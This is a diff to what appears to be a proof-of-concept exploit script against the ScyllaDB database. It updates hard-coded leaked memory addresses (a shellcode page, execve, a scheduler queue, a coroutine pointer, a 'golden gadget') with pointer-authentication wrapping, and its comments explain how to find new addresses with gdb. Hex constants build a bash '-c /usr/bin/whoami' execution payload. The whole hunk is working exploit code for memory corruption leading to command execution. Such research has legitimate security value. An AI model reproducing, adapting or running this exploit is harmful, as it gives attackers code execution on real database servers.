@@ -1131,16 +1131,18 @@ class Shell(cmd.Cmd):
         if not statement:
             return False, None
 
-        # In order for the exploit to run successfully, you may either 1)use the same version of ScyllaDB with which the exploit was developed or 2) update the following 4 addresses
+        # In order for the exploit to run successfully, you may either 1) use the same version of ScyllaDB with which the exploit was developed; or 2) update the following 5 addresses if needed
 
         #R+W mem page used for injecting shellcode:
-        BASE_SHELLCODE = 0x0000000006230000             # <--- leak -- recommended to inspect /proc/<pid>/maps, any writable address
+        BASE_SHELLCODE = 0x0000000006230000                 # <--- leak -- any writable address (W+X), recommended to inspect /proc/<pid>/maps (or vmmap in gdb GEF) for this
         #Address of execve()
-        EXECV_FUNC = pac_rev(0x00007fffef46a120)        # <--- leak -- on program output, can also use gdb
-        #Address of the scheduler queue
-        ATQ_LEAK_ADDR = pac(0x000060000015fac0)         # <--- leak -- on program output, can also use gdb
+        EXECV_FUNC = pac_rev(0x00007fffef46a120)            # <--- leak -- printed on program output, can also use gdb
+        #Address of the scheduler queue atq
+        ATQ_LEAK_ADDR = pac(0x000060000015fac0)             # <--- leak -- printed on program output, can also use gdb
         #Address of coroutine code in seastar/include/seastar/core/coroutine.hh:78
-        CORO_RESUME_PTR = pac_rev(0x0000000001f06ea0)   #<--- leak -- in C++, a pointer to a member function cannot be printed. Set breakpoint to above code in gdb
+        CORO_RESUME_PTR = pac_rev(0x0000000001f07220)       # <--- leak -- in C++, a pointer to a member function cannot be printed. Set breakpoint to seastar/include/seastar/core/coroutine.hh:78 in gdb. Any of the breakpoint-ed addresses work.
+        #Address of function rte_hash_hash()
+        GOLDEN_GADGET_ADDR = pac_rev(0x00007ffff1d88b30)    # <--- leak -- set gdb breakpoint on rte_hash_hash
 
         BASH_ARG_PTR_PTR = pac_rev(BASE_SHELLCODE+0x120)
         BASH_ARG0_PTR = pac_rev(BASE_SHELLCODE+0x148) #"4801230600000000"
@@ -1150,7 +1152,6 @@ class Shell(cmd.Cmd):
         BASH_ARG1_CONTENT = "2d63000000000000"
         BASH_ARG2_CONTENT_1 = "2f7573722f62696e"
         BASH_ARG2_CONTENT_2 = "2f77686f616d6900"
-        GOLDEN_GADGET_ADDR = pac_rev(0x00007ffff1d88b20) #"208bd8f1ff7f0000"
         BASH_RDI = pac_rev(BASE_SHELLCODE+0x170) #"7001230600000000"
         FINAL_RDI = BASH_ARG0_CONTENT
         BASH_RSI = BASH_ARG_PTR_PTR
